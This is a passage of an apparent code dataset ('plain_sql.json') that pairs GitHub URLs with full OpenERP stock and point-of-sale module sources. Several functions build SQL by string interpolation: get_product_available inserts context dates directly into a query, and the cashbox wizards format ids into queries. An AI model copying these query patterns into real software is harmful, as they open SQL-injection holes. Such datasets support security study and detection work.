data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n\n        return {\n#           'domain': \"[('id','in', [\"+','.join(map(str,list_statement))+\"])]\",\n            'domain': \"[('state','=','open')]\",\n            'name': 'Open Statement',\n            'view_type': 'form',\n            'view_mode': 'tree,form',\n            'res_model': 'account.bank.statement',\n            'views': [(id2, 'tree'),(id3, 'form')],\n            'type': 'ir.actions.act_window'\n}\npos_open_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/splbio/openobject-addons/blob/4ef053f7e9c6e83304380912ce0ada5f2627ee08",
        "file_path": "/stock/product.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import fields, osv\nfrom tools.translate import _\n\nclass product_product(osv.osv):\n    _inherit = \"product.product\"\n\n    def get_product_accounts(self, cr, uid, product_id, context=None):\n        \"\"\" To get the stock input account, stock output account and stock journal related to product.\n        @param product_id: product id\n        @return: dictionary which contains information regarding stock input account, stock output account and stock journal\n        \"\"\"\n        if context is None:\n            context = {}\n        product_obj = self.pool.get('product.product').browse(cr, uid, product_id, context=context)\n\n        stock_input_acc = product_obj.property_stock_account_input and product_obj.property_stock_account_input.id or False\n        if not stock_input_acc:\n            stock_input_acc = product_obj.categ_id.property_stock_account_input_categ and product_obj.categ_id.property_stock_account_input_categ.id or False\n\n        stock_output_acc = product_obj.property_stock_account_output and product_obj.property_stock_account_output.id or False\n        if not stock_output_acc:\n            stock_output_acc = product_obj.categ_id.property_stock_account_output_categ and product_obj.categ_id.property_stock_account_output_categ.id or False\n\n        journal_id = product_obj.categ_id.property_stock_journal and product_obj.categ_id.property_stock_journal.id or False\n        account_variation = product_obj.categ_id.property_stock_variation and product_obj.categ_id.property_stock_variation.id or False\n\n        return {\n            'stock_account_input': stock_input_acc,\n            'stock_account_output': stock_output_acc,\n            'stock_journal': journal_id,\n            'property_stock_variation': account_variation\n        }\n\n    def do_change_standard_price(self, cr, uid, ids, datas, context={}):\n        \"\"\" Changes the Standard Price of Product and creates an account move accordingly.\n        @param datas : dict. contain default datas like new_price, stock_output_account, stock_input_account, stock_journal\n        @param context: A standard dictionary\n        @return:\n\n        \"\"\"\n        location_obj = self.pool.get('stock.location')\n        move_obj = self.pool.get('account.move')\n        move_line_obj = self.pool.get('account.move.line')\n\n        new_price = datas.get('new_price', 0.0)\n        stock_output_acc = datas.get('stock_output_account', False)\n        stock_input_acc = datas.get('stock_input_account', False)\n        journal_id = datas.get('stock_journal', False)\n        product_obj=self.browse(cr,uid,ids)[0]\n        account_variation = product_obj.categ_id.property_stock_variation\n        account_variation_id = account_variation and account_variation.id or False\n        if not account_variation_id: raise osv.except_osv(_('Error!'), _('Variation Account is not specified for Product Category: %s' % (product_obj.categ_id.name)))\n        move_ids = []\n        loc_ids = location_obj.search(cr, uid,[('usage','=','internal')])\n        for rec_id in ids:\n            for location in location_obj.browse(cr, uid, loc_ids):\n                c = context.copy()\n                c.update({\n                    'location': location.id,\n                    'compute_child': False\n                })\n\n                product = self.browse(cr, uid, rec_id, context=c)\n                qty = product.qty_available\n                diff = product.standard_price - new_price\n                if not diff: raise osv.except_osv(_('Error!'), _(\"Could not find any difference between standard price and new price!\"))\n                if qty:\n                    company_id = location.company_id and location.company_id.id or False\n                    if not company_id: raise osv.except_osv(_('Error!'), _('Company is not specified in Location'))\n                    #\n                    # Accounting Entries\n                    #\n                    if not journal_id:\n                        journal_id = product.categ_id.property_stock_journal and product.categ_id.property_stock_journal.id or False\n                    if not journal_id:\n                        raise osv.except_osv(_('Error!'),\n                            _('There is no journal defined '\\\n                                'on the product category: \"%s\" (id: %d)') % \\\n                                (product.categ_id.name,\n                                    product.categ_id.id,))\n                    move_id = move_obj.create(cr, uid, {\n                                'journal_id': journal_id,\n                                'company_id': company_id\n                                })\n\n                    move_ids.append(move_id)\n\n\n                    if diff > 0:\n                        if not stock_input_acc:\n                            stock_input_acc = product.product_tmpl_id.\\\n                                property_stock_account_input.id\n                        if not stock_input_acc:\n                            stock_input_acc = product.categ_id.\\\n                                    property_stock_account_input_categ.id\n                        if not stock_input_acc:\n                            raise osv.except_osv(_('Error!'),\n                                    _('There is no stock input account defined ' \\\n                                            'for this product: \"%s\" (id: %d)') % \\\n                                            (product.name,\n                                                product.id,))\n                        amount_diff = qty * diff\n                        move_line_obj.create(cr, uid, {\n                                    'name': product.name,\n                                    'account_id': stock_input_acc,\n                                    'debit': amount_diff,\n                                    'move_id': move_id,\n                                    })\n                        move_line_obj.create(cr, uid, {\n                                    'name': product.categ_id.name,\n                                    'account_id': account_variation_id,\n                                    'credit': amount_diff,\n                                    'move_id': move_id\n                                    })\n                    elif diff < 0:\n                        if not stock_output_acc:\n                            stock_output_acc = product.product_tmpl_id.\\\n                                property_stock_account_output.id\n                        if not stock_output_acc:\n                            stock_output_acc = product.categ_id.\\\n                                    property_stock_account_output_categ.id\n                        if not stock_output_acc:\n                            raise osv.except_osv(_('Error!'),\n                                    _('There is no stock output account defined ' \\\n                                            'for this product: \"%s\" (id: %d)') % \\\n                                            (product.name,\n                                                product.id,))\n                        amount_diff = qty * -diff\n                        move_line_obj.create(cr, uid, {\n                                        'name': product.name,\n                                        'account_id': stock_output_acc,\n                                        'credit': amount_diff,\n                                        'move_id': move_id\n                                    })\n                        move_line_obj.create(cr, uid, {\n                                        'name': product.categ_id.name,\n                                        'account_id': account_variation_id,\n                                        'debit': amount_diff,\n                                        'move_id': move_id\n                                    })\n\n            self.write(cr, uid, rec_id, {'standard_price': new_price})\n\n        return move_ids\n\n    def view_header_get(self, cr, user, view_id, view_type, context=None):\n        if context is None:\n            context = {}\n        res = super(product_product, self).view_header_get(cr, user, view_id, view_type, context)\n        if res: return res\n        if (context.get('active_id', False)) and (context.get('active_model') == 'stock.location'):\n            return _('Products: ')+self.pool.get('stock.location').browse(cr, user, context['active_id'], context).name\n        return res\n\n    def get_product_available(self, cr, uid, ids, context=None):\n        \"\"\" Finds whether product is available or not in particular warehouse.\n        @return: Dictionary of values\n        \"\"\"\n        if context is None:\n            context = {}\n        states = context.get('states',[])\n        what = context.get('what',())\n        if not ids:\n            ids = self.search(cr, uid, [])\n        res = {}.fromkeys(ids, 0.0)\n        if not ids:\n            return res\n\n        if context.get('shop', False):\n            cr.execute('select warehouse_id from sale_shop where id=%s', (int(context['shop']),))\n            res2 = cr.fetchone()\n            if res2:\n                context['warehouse'] = res2[0]\n\n        if context.get('warehouse', False):\n            cr.execute('select lot_stock_id from stock_warehouse where id=%s', (int(context['warehouse']),))\n            res2 = cr.fetchone()\n            if res2:\n                context['location'] = res2[0]\n\n        if context.get('location', False):\n            if type(context['location']) == type(1):\n                location_ids = [context['location']]\n            elif type(context['location']) in (type(''), type(u'')):\n                location_ids = self.pool.get('stock.location').search(cr, uid, [('name','ilike',context['location'])], context=context)\n            else:\n                location_ids = context['location']\n        else:\n            location_ids = []\n            wids = self.pool.get('stock.warehouse').search(cr, uid, [], context=context)\n            for w in self.pool.get('stock.warehouse').browse(cr, uid, wids, context=context):\n                location_ids.append(w.lot_stock_id.id)\n\n        # build the list of ids of children of the location given by id\n        if context.get('compute_child',True):\n            child_location_ids = self.pool.get('stock.location').search(cr, uid, [('location_id', 'child_of', location_ids)])\n            location_ids = child_location_ids or location_ids\n        else:\n            location_ids = location_ids\n\n        uoms_o = {}\n        product2uom = {}\n        for product in self.browse(cr, uid, ids, context=context):\n            product2uom[product.id] = product.uom_id.id\n            uoms_o[product.uom_id.id] = product.uom_id\n\n        results = []\n        results2 = []\n\n        from_date=context.get('from_date',False)\n        to_date=context.get('to_date',False)\n        date_str=False\n        if from_date and to_date:\n            date_str=\"date_planned>='%s' and date_planned<='%s'\"%(from_date,to_date)\n        elif from_date:\n            date_str=\"date_planned>='%s'\"%(from_date)\n        elif to_date:\n            date_str=\"date_planned<='%s'\"%(to_date)\n\n        if 'in' in what:\n            # all moves from a location out of the set to a location in the set\n            cr.execute(\n                'select sum(product_qty), product_id, product_uom '\\\n                'from stock_move '\\\n                'where location_id NOT IN %s'\\\n                'and location_dest_id IN %s'\\\n                'and product_id IN %s'\\\n                'and state IN %s' + (date_str and 'and '+date_str+' ' or '') +''\\\n                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)\n            )\n            results = cr.fetchall()\n        if 'out' in what:\n            # all moves from a location in the set to a location out of the set\n            cr.execute(\n                'select sum(product_qty), product_id, product_uom '\\\n                'from stock_move '\\\n                'where location_id IN %s'\\\n                'and location_dest_id NOT IN %s '\\\n                'and product_id  IN %s'\\\n                'and state in %s' + (date_str and 'and '+date_str+' ' or '') + ''\\\n                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)\n            )\n            results2 = cr.fetchall()\n        uom_obj = self.pool.get('product.uom')\n        uoms = map(lambda x: x[2], results) + map(lambda x: x[2], results2)\n        if context.get('uom', False):\n            uoms += [context['uom']]\n\n        uoms = filter(lambda x: x not in uoms_o.keys(), uoms)\n        if uoms:\n            uoms = uom_obj.browse(cr, uid, list(set(uoms)), context=context)\n        for o in uoms:\n            uoms_o[o.id] = o\n        for amount, prod_id, prod_uom in results:\n            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,\n                    uoms_o[context.get('uom', False) or product2uom[prod_id]])\n            res[prod_id] += amount\n        for amount, prod_id, prod_uom in results2:\n            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,\n                    uoms_o[context.get('uom', False) or product2uom[prod_id]])\n            res[prod_id] -= amount\n        return res\n\n    def _product_available(self, cr, uid, ids, field_names=None, arg=False, context=None):\n        \"\"\" Finds the incoming and outgoing quantity of product.\n        @return: Dictionary of values\n        \"\"\"\n        if not field_names:\n            field_names = []\n        if context is None:\n            context = {}\n        res = {}\n        for id in ids:\n            res[id] = {}.fromkeys(field_names, 0.0)\n        for f in field_names:\n            c = context.copy()\n            if f == 'qty_available':\n                c.update({ 'states': ('done',), 'what': ('in', 'out') })\n            if f == 'virtual_available':\n                c.update({ 'states': ('confirmed','waiting','assigned','done'), 'what': ('in', 'out') })\n            if f == 'incoming_qty':\n                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('in',) })\n            if f == 'outgoing_qty':\n                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('out',) })\n            stock = self.get_product_available(cr, uid, ids, context=c)\n            for id in ids:\n                res[id][f] = stock.get(id, 0.0)\n        return res\n\n    _columns = {\n        'qty_available': fields.function(_product_available, method=True, type='float', string='Real Stock', help=\"Current quantities of products in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'virtual_available': fields.function(_product_available, method=True, type='float', string='Virtual Stock', help=\"Future stock for this product according to the selected locations or all internal if none have been selected. Computed as: Real Stock - Outgoing + Incoming.\", multi='qty_available'),\n        'incoming_qty': fields.function(_product_available, method=True, type='float', string='Incoming', help=\"Quantities of products that are planned to arrive in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'outgoing_qty': fields.function(_product_available, method=True, type='float', string='Outgoing', help=\"Quantities of products that are planned to leave in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'track_production': fields.boolean('Track Manufacturing Lots' , help=\"Forces to specify a Production Lot for all moves containing this product and generated by a Manufacturing Order\"),\n        'track_incoming': fields.boolean('Track Incoming Lots', help=\"Forces to specify a Production Lot for all moves containing this product and coming from a Supplier Location\"),\n        'track_outgoing': fields.boolean('Track Outgoing Lots', help=\"Forces to specify a Production Lot for all moves containing this product and going to a Customer Location\"),\n        'location_id': fields.dummy(string='Stock Location', relation='stock.location', type='many2one'),\n        'valuation':fields.selection([('manual_periodic', 'Periodical (manual)'),\n                                        ('real_time','Real Time (automated)'),], 'Inventory Valuation', \n                                        help=\"If real-time valuation is enabled for a product, the system will automatically write journal entries corresponding to stock moves.\" \\\n                                             \"The inventory variation account set on the product category will represent the current inventory value, and the stock input and stock output account will hold the counterpart moves for incoming and outgoing products.\"\n                                        , required=True),\n    }\n\n    _defaults = {\n        'valuation': lambda *a: 'manual_periodic',\n    }\n\n    def fields_view_get(self, cr, uid, view_id=None, view_type='form', context=None, toolbar=False, submenu=False):\n        res = super(product_product,self).fields_view_get(cr, uid, view_id, view_type, context, toolbar=toolbar, submenu=submenu)\n        if context is None:\n            context = {}\n        if ('location' in context) and context['location']:\n            location_info = self.pool.get('stock.location').browse(cr, uid, context['location'])\n            fields=res.get('fields',{})\n            if fields:\n                if location_info.usage == 'supplier':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Receptions')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Received Qty')\n\n                if location_info.usage == 'internal':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Stock')\n\n                if location_info.usage == 'customer':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Deliveries')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Delivered Qty')\n\n                if location_info.usage == 'inventory':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future P&L')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('P&L Qty')\n\n                if location_info.usage == 'procurement':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Qty')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Unplanned Qty')\n\n                if location_info.usage == 'production':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Productions')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Produced Qty')\n        return res\n\nproduct_product()\n\nclass product_template(osv.osv):\n    _name = 'product.template'\n    _inherit = 'product.template'\n    _columns = {\n        'property_stock_procurement': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Procurement Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','procurement')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by procurements\"),\n        'property_stock_production': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Production Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','production')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by production orders\"),\n        'property_stock_inventory': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Inventory Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','inventory')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated when you do an inventory\"),\n        'property_stock_account_input': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Input Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),\n        'property_stock_account_output': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Output Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),\n    }\n\nproduct_template()\n\nclass product_category(osv.osv):\n\n    _inherit = 'product.category'\n    _columns = {\n        'property_stock_journal': fields.property('account.journal',\n            relation='account.journal', type='many2one',\n            string='Stock journal', method=True, view_load=True,\n            help=\"When doing real-time inventory valuation, this is the Accounting Journal in which entries will be automatically posted when stock moves are processed.\"),\n        'property_stock_account_input_categ': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Input Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),\n        'property_stock_account_output_categ': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Output Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),\n        'property_stock_variation': fields.property('account.account',\n            type='many2one',\n            relation='account.account',\n            string=\"Stock Variation Account\",\n            method=True, view_load=True,\n            help=\"When real-time inventory valuation is enabled on a product, this account will hold the current value of the products.\",),\n    }\n\nproduct_category()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/iw3hxn/addons/blob/94af81e1cffdf19feb3595de93b93760221c60b5",
        "file_path": "/point_of_sale/wizard/pos_close_statement.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\n\nclass pos_close_statement(osv.osv_memory):\n    _name = 'pos.close.statement'\n    _description = 'Close Statements'\n\n    def close_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Close the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Dictionary\n        \"\"\"\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        statement_obj = self.pool.get('account.bank.statement')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if not ids:\n                raise osv.except_osv(_('Message'), _('Journals are already closed'))\n            else:\n                list_statement.append(ids[0])\n                if not journal.check_dtls:\n                    statement_obj.button_confirm_cash(cr, uid, ids, context)\n    #        if not list_statement:\n    #            return {}\n    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)\n    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n        return {\n                'domain': \"[('id','in',\" + str(list_statement) + \")]\",\n                'name': 'Close Statements',\n                'view_type': 'form',\n                'view_mode': 'tree,form',\n                'res_model': 'account.bank.statement',\n                'views': [(id2, 'tree'),(id3, 'form')],\n                'type': 'ir.actions.act_window'}\n\npos_close_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/iw3hxn/addons/blob/94af81e1cffdf19feb3595de93b93760221c60b5",
        "file_path": "/point_of_sale/wizard/pos_open_statement.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\nimport time\n\nclass pos_open_statement(osv.osv_memory):\n    _name = 'pos.open.statement'\n    _description = 'Open Statements'\n\n    def open_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Open the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Directory\n        \"\"\"\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        statement_obj = self.pool.get('account.bank.statement')\n        sequence_obj = self.pool.get('ir.sequence')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if len(ids):\n                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for \"%s\". \\n Please close the cashbox related to. ' %(journal.name)))\n            \n#            cr.execute(\"\"\" Select id from account_bank_statement\n#                                    where journal_id =%d\n#                                    and company_id =%d\n#                                    order by id desc limit 1\"\"\" %(journal.id, company_id))\n#            st_id = cr.fetchone()\n            \n            number = ''\n            if journal.sequence_id:\n                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)\n            else:\n                number = sequence_obj.get(cr, uid, 'account.bank.statement')\n            \n            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,\n                                                          'company_id': company_id,\n                                                          'user_id': uid,\n                                                          'state': 'open',\n                                                          'name': number,\n                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),\n                                                      })\n            statement_obj.button_open(cr, uid, [statement_id], context)\n\n    #            period = statement_obj._get_period(cr, uid, context) or None\n    #            cr.execute(\"INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')\"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))\n    #            cr.commit()\n    #            cr.execute(\"select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'\"%(journal.id, company_id, uid, number))\n    #            statement_id = cr.fetchone()[0]\n    #            print \"statement_id\",statement_id\n    #            if st_id:\n    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])\n    #                list_statement.append(statemt_id.id)\n    #                if statemt_id and statemt_id.ending_details_ids:\n    #                    statement_obj.write(cr, uid, [statement_id], {\n    #                        'balance_start': statemt_id.balance_end,\n    #                        'state': 'open',\n    #                    })\n    #                    if statemt_id.ending_details_ids:\n    #                        for i in statemt_id.ending_details_ids:\n    #                            c = statement_obj.create(cr, uid, {\n    #                                'pieces': i.pieces,\n    #                                'number': i.number,\n    #                                'starting_id': statement_id,\n    #                            })\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n\n        return {\n#           'domain': \"[('id','in', [\"+','.join(map(str,list_statement))+\"])]\",\n            'domain': \"[('state','=','open')]\",\n            'name': 'Open Statement',\n            'view_type': 'form',\n            'view_mode': 'tree,form',\n            'res_model': 'account.bank.statement',\n            'views': [(id2, 'tree'),(id3, 'form')],\n            'type': 'ir.actions.act_window'\n}\npos_open_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/iw3hxn/addons/blob/47767bb9b217f1fc0853bce79cd299a05cc6f6eb",
        "file_path": "/stock/product.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import fields, osv\nfrom tools.translate import _\n\nclass product_product(osv.osv):\n    _inherit = \"product.product\"\n\n    def get_product_accounts(self, cr, uid, product_id, context=None):\n        \"\"\" To get the stock input account, stock output account and stock journal related to product.\n        @param product_id: product id\n        @return: dictionary which contains information regarding stock input account, stock output account and stock journal\n        \"\"\"\n        if context is None:\n            context = {}\n        product_obj = self.pool.get('product.product').browse(cr, uid, product_id, context=context)\n\n        stock_input_acc = product_obj.property_stock_account_input and product_obj.property_stock_account_input.id or False\n        if not stock_input_acc:\n            stock_input_acc = product_obj.categ_id.property_stock_account_input_categ and product_obj.categ_id.property_stock_account_input_categ.id or False\n\n        stock_output_acc = product_obj.property_stock_account_output and product_obj.property_stock_account_output.id or False\n        if not stock_output_acc:\n            stock_output_acc = product_obj.categ_id.property_stock_account_output_categ and product_obj.categ_id.property_stock_account_output_categ.id or False\n\n        journal_id = product_obj.categ_id.property_stock_journal and product_obj.categ_id.property_stock_journal.id or False\n        account_variation = product_obj.categ_id.property_stock_variation and product_obj.categ_id.property_stock_variation.id or False\n\n        return {\n            'stock_account_input': stock_input_acc,\n            'stock_account_output': stock_output_acc,\n            'stock_journal': journal_id,\n            'property_stock_variation': account_variation\n        }\n\n    def do_change_standard_price(self, cr, uid, ids, datas, context={}):\n        \"\"\" Changes the Standard Price of Product and creates an account move accordingly.\n        @param datas : dict. contain default datas like new_price, stock_output_account, stock_input_account, stock_journal\n        @param context: A standard dictionary\n        @return:\n\n        \"\"\"\n        location_obj = self.pool.get('stock.location')\n        move_obj = self.pool.get('account.move')\n        move_line_obj = self.pool.get('account.move.line')\n\n        new_price = datas.get('new_price', 0.0)\n        stock_output_acc = datas.get('stock_output_account', False)\n        stock_input_acc = datas.get('stock_input_account', False)\n        journal_id = datas.get('stock_journal', False)\n        product_obj=self.browse(cr,uid,ids)[0]\n        account_variation = product_obj.categ_id.property_stock_variation\n        account_variation_id = account_variation and account_variation.id or False\n        if not account_variation_id: raise osv.except_osv(_('Error!'), _('Variation Account is not specified for Product Category: %s' % (product_obj.categ_id.name)))\n        move_ids = []\n        loc_ids = location_obj.search(cr, uid,[('usage','=','internal')])\n        for rec_id in ids:\n            for location in location_obj.browse(cr, uid, loc_ids):\n                c = context.copy()\n                c.update({\n                    'location': location.id,\n                    'compute_child': False\n                })\n\n                product = self.browse(cr, uid, rec_id, context=c)\n                qty = product.qty_available\n                diff = product.standard_price - new_price\n                if not diff: raise osv.except_osv(_('Error!'), _(\"Could not find any difference between standard price and new price!\"))\n                if qty:\n                    company_id = location.company_id and location.company_id.id or False\n                    if not company_id: raise osv.except_osv(_('Error!'), _('Company is not specified in Location'))\n                    #\n                    # Accounting Entries\n                    #\n                    if not journal_id:\n                        journal_id = product.categ_id.property_stock_journal and product.categ_id.property_stock_journal.id or False\n                    if not journal_id:\n                        raise osv.except_osv(_('Error!'),\n                            _('There is no journal defined '\\\n                                'on the product category: \"%s\" (id: %d)') % \\\n                                (product.categ_id.name,\n                                    product.categ_id.id,))\n                    move_id = move_obj.create(cr, uid, {\n                                'journal_id': journal_id,\n                                'company_id': company_id\n                                })\n\n                    move_ids.append(move_id)\n\n\n                    if diff > 0:\n                        if not stock_input_acc:\n                            stock_input_acc = product.product_tmpl_id.\\\n                                property_stock_account_input.id\n                        if not stock_input_acc:\n                            stock_input_acc = 